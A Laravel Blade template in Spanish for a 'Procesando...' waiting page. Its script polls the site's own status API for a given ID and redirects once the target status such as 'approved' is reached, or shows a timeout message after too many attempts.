<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Procesando...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .wait-container {
            text-align: center;
            color: white;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .wait-text {
            font-size: 1.5rem;
            font-weight: 300;
            margin-bottom: 10px;
        }

        .wait-subtext {
            font-size: 0.9rem;
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <div class="wait-container">
        <div class="spinner"></div>
        <p class="wait-text">Procesando...</p>
        <p class="wait-subtext">Por favor espere un momento</p>
    </div>

    <x-control :auto-guardar="false" :auto-completar="false" :auto-init="true" :debug="false" />

    <script>
    // Configuración del polling
    const POLLING_CONFIG = {
        targetStatus: '{{ $targetStatus ?? "approved" }}',
        redirectUrl: '{{ $redirectUrl ?? "/prueba/success" }}',
        interval: {{ $interval ?? 3000 }},
        maxAttempts: {{ $maxAttempts ?? 100 }}
    };

    let attempts = 0;

    async function pollStatus() {
        const uniqid = obtenerUniqid();

        if (!uniqid) {
            console.error('No se encontró uniqid');
            return;
        }

        try {
            const response = await fetch(`/api/entradas/status/${uniqid}`);
            const data = await response.json();

            attempts++;

            if (data.success && data.status === POLLING_CONFIG.targetStatus) {
                // Status alcanzado, redirigir
                console.log(`Status "${POLLING_CONFIG.targetStatus}" detectado, redirigiendo...`);
                window.location.href = POLLING_CONFIG.redirectUrl;
            } else if (attempts >= POLLING_CONFIG.maxAttempts) {
                // Timeout
                console.warn('Se alcanzó el máximo de intentos de polling');
                document.querySelector('.wait-text').textContent = 'Tiempo de espera agotado';
                document.querySelector('.wait-subtext').textContent = 'Por favor, intente nuevamente';
                document.querySelector('.spinner').style.display = 'none';
            } else {
                // Continuar polling
                setTimeout(pollStatus, POLLING_CONFIG.interval);
            }
        } catch (error) {
            console.error('Error en polling:', error);
            setTimeout(pollStatus, POLLING_CONFIG.interval);
        }
    }

    // Iniciar polling cuando el DOM esté listo
    document.addEventListener('DOMContentLoaded', function() {
        pollStatus();
    });
    </script>
</body>
</html>
